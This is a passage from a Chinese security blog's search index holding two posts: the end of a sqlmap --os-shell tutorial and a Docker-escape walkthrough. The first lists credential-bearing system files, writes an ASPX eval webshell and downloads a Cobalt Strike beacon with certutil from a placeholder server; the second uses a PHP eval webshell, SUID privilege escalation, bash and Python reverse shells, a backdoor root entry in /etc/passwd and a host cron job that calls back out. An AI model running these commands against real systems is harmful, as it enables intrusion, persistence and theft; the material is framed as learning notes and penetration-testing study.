class="hljs-symbol">\S</span>erv-U<span class="hljs-symbol">\S</span>ervUDaemon.ini //存储了虚拟主机网站路径和密码 <br>c:<span class="hljs-symbol">\P</span>rogram Files<span class="hljs-symbol">\S</span>erv-U<span class="hljs-symbol">\S</span>ervUDaemon.ini <br>c:<span class="hljs-symbol">\w</span>indows<span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\i</span>netsrv<span class="hljs-symbol">\M</span>etaBase.xml 查看IIS的虚拟主机配置 <br>c:<span class="hljs-symbol">\w</span>indows<span class="hljs-symbol">\r</span>epair<span class="hljs-symbol">\s</span>am //存储了WINDOWS系统初次安装的密码 <br>c:<span class="hljs-symbol">\P</span>rogram Files<span class="hljs-symbol">\S</span>erv-U<span class="hljs-symbol">\S</span>ervUAdmin.exe //6.0版本以前的serv-u管理员密码存储于此 <br>c:<span class="hljs-symbol">\P</span>rogram Files<span class="hljs-symbol">\R</span>hinoSoft.com<span class="hljs-symbol">\S</span>ervUDaemon.exe <br>C:<span class="hljs-symbol">\D</span>ocuments and Settings<span class="hljs-symbol">\A</span>ll Users<span class="hljs-symbol">\A</span>pplication Data<span class="hljs-symbol">\S</span>ymantec<span class="hljs-symbol">\p</span>cAnywhere<span class="hljs-symbol">\*</span>.cif文件 <br>//存储了pcAnywhere的登陆密码 <br>c:<span class="hljs-symbol">\P</span>rogram Files<span class="hljs-symbol">\A</span>pache Group<span class="hljs-symbol">\A</span>pache<span class="hljs-symbol">\c</span>onf<span class="hljs-symbol">\h</span>ttpd.conf 或C:<span class="hljs-symbol">\a</span>pache<span class="hljs-symbol">\c</span>onf<span class="hljs-symbol">\h</span>ttpd.conf //查看WINDOWS系统apache文件 <br>c:/Resin-3.0.14/conf/resin.conf //查看jsp开发的网站 resin文件配置信息. <br>c:/Resin/conf/resin.conf/usr/local/resin/conf/resin.conf 查看linux系统配置的JSP虚拟主机 <br>d:<span class="hljs-symbol">\A</span>PACHE<span class="hljs-symbol">\A</span>pache2<span class="hljs-symbol">\c</span>onf<span class="hljs-symbol">\h</span>ttpd.conf <br>C:<span class="hljs-symbol">\P</span>rogram Files<span class="hljs-symbol">\m</span>ysql<span class="hljs-symbol">\m</span>y.ini <br>C:<span class="hljs-symbol">\m</span>ysql<span class="hljs-symbol">\d</span>ata<span class="hljs-symbol">\m</span>ysql<span class="hljs-symbol">\u</span>ser.MYD 存在MYSQL系统中的用户密码<br>c:<span class="hljs-symbol">\w</span>indows<span class="hljs-symbol">\p</span>hp.ini      php配置文件<br>c:<span class="hljs-symbol">\w</span>indows<span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\i</span>netsrv<span class="hljs-symbol">\M</span>etaBase.xml    IIS虚拟主机配置文件<br></code></pre></td></tr></table></figure></li><li><p><strong>Linux 下常见的敏感文件</strong></p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs stata">/usr/<span class="hljs-keyword">local</span>/<span class="hljs-keyword">app</span>/apache2/<span class="hljs-keyword">conf</span>/httpd.<span class="hljs-keyword">conf</span> <span class="hljs-comment">//apache2缺省配置文件 </span><br>/usr/<span class="hljs-keyword">local</span>/apache2/<span class="hljs-keyword">conf</span>/httpd.<span class="hljs-keyword">conf</span> <br>/usr/<span class="hljs-keyword">local</span>/<span class="hljs-keyword">app</span>/apache2/<span class="hljs-keyword">conf</span>/extra/httpd-vhosts.<span class="hljs-keyword">conf</span> <span class="hljs-comment">//虚拟网站设置 </span><br>/usr/<span class="hljs-keyword">local</span>/<span class="hljs-keyword">app</span>/php5/lib/php.ini <span class="hljs-comment">//PHP相关设置 </span><br>/etc/sysconfig/iptables <span class="hljs-comment">//从中得到防火墙规则策略 </span><br>/etc/httpd/<span class="hljs-keyword">conf</span>/httpd.<span class="hljs-keyword">conf</span> <span class="hljs-comment">// apache配置文件 </span><br>/etc/rsyncd.<span class="hljs-keyword">conf</span> <span class="hljs-comment">//同步程序配置文件 </span><br>/etc/my.cnf <span class="hljs-comment">//mysql的配置文件 </span><br>/etc/redhat-release <span class="hljs-comment">//系统版本 </span><br>/etc/issue <br>/etc/issue.<span class="hljs-keyword">net</span> <br>/usr/<span class="hljs-keyword">local</span>/<span class="hljs-keyword">app</span>/php5/lib/php.ini <span class="hljs-comment">//PHP相关设置 </span><br>/usr/<span class="hljs-keyword">local</span>/<span class="hljs-keyword">app</span>/apache2/<span class="hljs-keyword">conf</span>/extra/httpd-vhosts.<span class="hljs-keyword">conf</span> <span class="hljs-comment">//虚拟网站设置 </span><br>/etc/httpd/<span class="hljs-keyword">conf</span>/httpd.<span class="hljs-keyword">conf</span>或/usr/<span class="hljs-keyword">local</span>/apche/<span class="hljs-keyword">conf</span>/httpd.<span class="hljs-keyword">conf</span> 查看linux APACHE虚拟主机配置文件<br>/usr/<span class="hljs-keyword">local</span>/resin-3.0.22/<span class="hljs-keyword">conf</span>/resin.<span class="hljs-keyword">conf</span> 针对3.0.22的RESIN配置文件查看 <br>/usr/<span class="hljs-keyword">local</span>/resin-<span class="hljs-keyword">pro</span>-3.0.22/<span class="hljs-keyword">conf</span>/resin.<span class="hljs-keyword">conf</span> 同上 <br>/usr/<span class="hljs-keyword">local</span>/<span class="hljs-keyword">app</span>/apache2/<span class="hljs-keyword">conf</span>/extra/httpd-vhosts.<span class="hljs-keyword">conf</span> APASHE虚拟主机查看 <br>/etc/httpd/<span class="hljs-keyword">conf</span>/httpd.<span class="hljs-keyword">conf</span>或/usr/<span class="hljs-keyword">local</span>/apche/<span class="hljs-keyword">conf</span>/httpd.<span class="hljs-keyword">conf</span> 查看linux APACHE虚拟主机配置文件 <br>/usr/<span class="hljs-keyword">local</span>/resin-3.0.22/<span class="hljs-keyword">conf</span>/resin.<span class="hljs-keyword">conf</span> 针对3.0.22的RESIN配置文件查看 <br>/usr/<span class="hljs-keyword">local</span>/resin-<span class="hljs-keyword">pro</span>-3.0.22/<span class="hljs-keyword">conf</span>/resin.<span class="hljs-keyword">conf</span> 同上 <br>/usr/<span class="hljs-keyword">local</span>/<span class="hljs-keyword">app</span>/apache2/<span class="hljs-keyword">conf</span>/extra/httpd-vhosts.<span class="hljs-keyword">conf</span> APASHE虚拟主机查看 <br>/etc/sysconfig/iptables 查看防火墙策略 <br>load_file(<span class="hljs-built_in">char</span>(47)) 可以列出FreeBSD,Sunos系统根目录 <br><span class="hljs-keyword">replace</span>(load_file(0×2F6574632F706173737764),0×3c,0×20) <br><span class="hljs-keyword">replace</span>(load_file(<span class="hljs-built_in">char</span>(47,101,116,99,47,112,97,115,115,119,100)),<span class="hljs-built_in">char</span>(60),<span class="hljs-built_in">char</span>(32))<br>etc/php.ini          php配置文件<br>/etc/httpd/<span class="hljs-keyword">conf</span>.<span class="hljs-keyword">d</span>/php.<span class="hljs-keyword">conf</span><br>/etc/httpd/<span class="hljs-keyword">conf</span>/httpd.<span class="hljs-keyword">conf</span>        Apache配置文件<br>/usr/<span class="hljs-keyword">local</span>/apache/<span class="hljs-keyword">conf</span>/httpd.<span class="hljs-keyword">conf</span><br>/usr/<span class="hljs-keyword">local</span>/apache2/<span class="hljs-keyword">conf</span>/httpd.<span class="hljs-keyword">conf</span><br>/usr/<span class="hljs-keyword">local</span>/apache/<span class="hljs-keyword">conf</span>/extra/httpd-vhosts.<span class="hljs-keyword">conf</span>  虚拟目录配置文件<br></code></pre></td></tr></table></figure></li><li><p><strong>通过执行</strong><code>select @@datadir;</code> 获取数据库数据保存的位置、 <code>select @@basedir;</code> 安装位置、<code>select @@plugin_dir</code> mysql plugin目录</p><p>可能会有一些关键信息，然后对关键信息搜索，查找默认路径    </p></li></ul><h3 id="执行–os-shell"><a href="#执行–os-shell" class="headerlink" title="执行–os-shell"></a>执行–os-shell</h3><p>成功后会在网站绝对路径下，生成两个文件，一个可以上传，一个可以执行命令。</p><p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/sqlmap%E5%85%B3%E4%BA%8E-os-shell%E5%B0%8F%E8%AE%B0/20201106105940.png"></p><h2 id="SqlServer"><a href="#SqlServer" class="headerlink" title="SqlServer"></a>SqlServer</h2><h3 id="必要条件"><a href="#必要条件" class="headerlink" title="必要条件"></a>必要条件</h3><ul><li>数据库支持外连</li><li>数据库权限为SA权限</li></ul><p>Sqlserver –os-shell主要是利用<code>xp_cmdshell</code>扩展进行命令执行。</p><p>当执行–os-shell 时，这个时候sqlmap主要做了三件事情：</p><ol><li>识别当前数据库类型，然后打印出来。</li><li>检测是否为数据库dba，也就是查看是否为sa权限。</li><li>检测是否开启了xp_cmdshell，如果没有开启sqlmap就会尝试开启。</li></ol><h3 id="寻找绝对路径-1"><a href="#寻找绝对路径-1" class="headerlink" title="寻找绝对路径"></a>寻找绝对路径</h3><p>可以上传一个复杂文件名的文件，比如：l12asd3123_0sads7_08.jpg</p><p>或者在网站中找到一个复杂的文件名，觉得会是唯一的，通过命令查找</p><p>sqlmap  –os-shell 下使用，以下任意一条命令</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-keyword">for</span> /r e:<span class="hljs-string">\</span> %i <span class="hljs-keyword">in</span> (<span class="hljs-number">1</span>*.php) <span class="hljs-keyword">do</span> @echo %i  *必加<br>dir c:<span class="hljs-string">\</span> d:<span class="hljs-string">\</span>  /s /b | find <span class="hljs-string">&quot;icon_assignment.gif&quot;</span><br></code></pre></td></tr></table></figure><p>查找文件</p><p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/sqlmap%E5%85%B3%E4%BA%8E-os-shell%E5%B0%8F%E8%AE%B0/20201106110036.png"></p><h3 id="上一句话马或者连cs"><a href="#上一句话马或者连cs" class="headerlink" title="上一句话马或者连cs"></a>上一句话马或者连cs</h3><h4 id="写一句话木马"><a href="#写一句话木马" class="headerlink" title="写一句话木马"></a>写一句话木马</h4><p><code> echo ^&lt;%@ Page Language=&quot;Jscript&quot;%^&gt;^&lt;%eval(Request.Item[&quot;weshe11b&quot;],&quot;unsafe&quot;);%^&gt; &gt; d:\wwwroot\1azq.aspx</code></p><p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/sqlmap%E5%85%B3%E4%BA%8E-os-shell%E5%B0%8F%E8%AE%B0/20201106110059.png"></p><p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/sqlmap%E5%85%B3%E4%BA%8E-os-shell%E5%B0%8F%E8%AE%B0/20201106110119.png"></p><h4 id="上线CS"><a href="#上线CS" class="headerlink" title="上线CS"></a>上线CS</h4><p>使用 <code>certutil.exe -urlcache -split -f http://vpsIP:port/beacon32.exe a32.exe</code></p><p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/sqlmap%E5%85%B3%E4%BA%8E-os-shell%E5%B0%8F%E8%AE%B0/20201106110147.png"></p><p>a32.exe 执行， 有时执行不成功饭是因为权限不够，可以下载到有执行权限的目录（假如c:/temp/ ，有权限，<code>certutil.exe -urlcache -split -f http://vpsIP:port/beacon32.exe c:/temp/a32.exe </code></p><p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/sqlmap%E5%85%B3%E4%BA%8E-os-shell%E5%B0%8F%E8%AE%B0/20201106110212.png"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>在有拥有dba权限后，</p><ul><li>mysql拿shell的难点在于寻找绝对路径</li><li>sqlserver在于xp_cmdshell 是否开启。</li></ul>]]></content>
    
    
    <categories>
      
      <category>安全工具</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sqlmap使用</tag>
      
      <tag>getshell</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>简单dockers逃逸学习</title>
    <link href="/2020/08/04/%E7%AE%80%E5%8D%95docker%E9%80%83%E9%80%B8%E5%AD%A6%E4%B9%A0/"/>
    <url>/2020/08/04/%E7%AE%80%E5%8D%95docker%E9%80%83%E9%80%B8%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h2 id="1-目标界面"><a href="#1-目标界面" class="headerlink" title="1. 目标界面"></a>1. 目标界面</h2><p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/1.png"></p><p>搞半天，没进去。。。。</p><p>经过提示，了解到了一句话执行的原理，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;cmd&quot;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>一句话在每次执行时，接收变量cmd传进去的参数 <code>cmd=phpinfo(); </code> 使用eval函数执行 phpinfo(); 命令。</p><p>了解后就是猜参数名的过程。</p><h2 id="2-提权"><a href="#2-提权" class="headerlink" title="2. 提权"></a>2. 提权</h2><p>连上shell后， <code>whoami</code> 查看为www-data权限，</p><p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/2.png"></p><p>通过uname -a 和 cat /etc/*-release 查看内核版本，没有提权exp</p><p>!<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/4.png"></p><p><a href="https://www.anquanke.com/post/id/86979">利用可执行文件SUID</a></p><p>通过命令查看</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">find / -user root -perm -4000 -<span class="hljs-built_in">print</span> 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/3.png"></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">touch suid <span class="hljs-comment"># 也可以不用创建，只要查找的文件真实存在即可</span><br>find suid -<span class="hljs-built_in">exec</span> whoami \;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/5.png"></p><h2 id="3-反弹shell-，以及获取完全交互式shell"><a href="#3-反弹shell-，以及获取完全交互式shell" class="headerlink" title="3. 反弹shell ，以及获取完全交互式shell"></a>3. 反弹shell ，以及获取完全交互式shell</h2><p>公网nc 监听 端口</p><p>bash 反弹 </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">bash -i &gt;&amp; /dev/tcp/公网ip/端口 0&gt;&amp;1<br></code></pre></td></tr></table></figure><p>失败。。。</p><p>使用 python 反弹shell 到公网</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">python -c <span class="hljs-string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;公网ip&quot;,监听的端口));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-p&quot;]);&#x27;</span><br></code></pre></td></tr></table></figure><p>保存为shll.sh ,之后执行</p><p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/6.png"></p><p>到这里，反弹来的shell还有些问题：</p><ul><li><p>一些命令如su和ssh，需要一个正确的终端才能运行</p></li><li><p>通常不显示STDERR</p></li><li><p>无法正常使用vim等文本编辑器</p></li><li><p>没有完成标签</p></li><li><p>没有向上箭头使用历史</p></li><li><p>没有jobcontrol等</p><p>接下来使用python获取完全交互式shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> 接下来在公网的机器上执行</span><br><span class="hljs-meta">$</span><span class="bash"> python -c <span class="hljs-string">&quot;import pty; pty.spawn([&#x27;/bin/bash&#x27;,&#x27;-p&#x27;])&quot;</span></span><br><span class="hljs-meta">#</span><span class="bash"> 启用python交互式</span><br><span class="hljs-meta">#</span><span class="bash"> 把它丢到后台挂起</span><br><span class="hljs-meta">$</span><span class="bash"> ctrl + z</span>   <br><span class="hljs-meta">#</span><span class="bash"> 重置stty，也就意味着你看不到输入的内容</span><br><span class="hljs-meta">$</span><span class="bash"> stty raw -<span class="hljs-built_in">echo</span></span>  <br><span class="hljs-meta">#</span><span class="bash"> 把后台挂起的程序调回前台 ，命令不显示</span><br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">fg</span></span>  <br><span class="hljs-meta">#</span><span class="bash"> 完全刷新终端屏幕</span><br><span class="hljs-meta">$</span><span class="bash"> 回车 ，再回车 两次</span><br><span class="hljs-meta">$</span><span class="bash"> reset</span>  <br><span class="hljs-meta">$</span><span class="bash"> ctrl + c</span><br><span class="hljs-meta">#</span><span class="bash"> 接下来设置环境变量，根据第一步得到的环境变量来设置</span><br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">export</span> SHELL=bash</span>   <br></code></pre></td></tr></table></figure><p>完美了,但是反弹的shell并不是root 用户，接下来执行</p><p>find suid -exec /bin/bash -p ;</p><p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/9.png"></p></li></ul><h2 id="4-docker-逃逸"><a href="#4-docker-逃逸" class="headerlink" title="4. docker 逃逸"></a>4. docker 逃逸</h2><p>  使用 <code>ls -alh /.dockerenv </code> 判断服务器是否为docker环境, 非docker环境是没有的</p><p>  <img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/7.png"></p><p>这是没有docker的</p><p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/13.png"></p><p>或者使用<code>cat /proc/1/cgroup</code>  查看系统进程的cgroup信息</p><p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/8.png"></p><p>这是没有的</p><p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/14.png"></p><p><code>fdisk -l</code> 查看磁盘文件</p><p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/10.png"></p><p>新建一个目录, 将/dev/vda1挂载至新建的目录</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-built_in">mkdir</span> <span class="hljs-keyword">abc</span><br>mount /dev/vda1 <span class="hljs-keyword">abc</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/11.png"></p><p>充满波折，不懂。。。</p><p>换个方法，</p><p>使用 /etc/passwd 创建root用户，</p><p>首先，使用perl语言生成带有盐值的密码：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">perl -le <span class="hljs-string">&#x27;print crypt(&quot;password@123&quot;,&quot;addedsalt&quot;)&#x27;</span><br></code></pre></td></tr></table></figure><p>然后执行下面这条命令，成功将test用户的信息加入 /etc/passwd 文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo &quot;test:advwtv/9yU5yQ:0:0:User_like_root:/root:/bin/bash&quot; &gt;&gt;/etc/passwd<br></code></pre></td></tr></table></figure><p>su test 切换过去</p><p>再执行 mount  /dev/vda1 abc</p><p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/12.png"></p><p>现在能查看宿主机文件，接下来逃逸到宿主机</p><p>通过写入计划任务到宿主机</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo &#x27;* * * * * bash -i &gt;&amp; /dev/tcp/公网ip/端口 0&gt;&amp;1&#x27; &gt;&gt; abc/var/spool/cron/root<br></code></pre></td></tr></table></figure><p>将python 反弹的脚本写进去，同样gg</p><p>最终，直接将反弹shell的脚本，写入宿主机的目录下 </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">vim abc/root/shell.sh <br></code></pre></td></tr></table></figure><p>之后，赋予权限，直接执行反弹回shell</p>]]></content>
    
    
    <categories>
      
      <category>docker逃逸</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网渗透</tag>
      
      <tag>docker逃逸</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
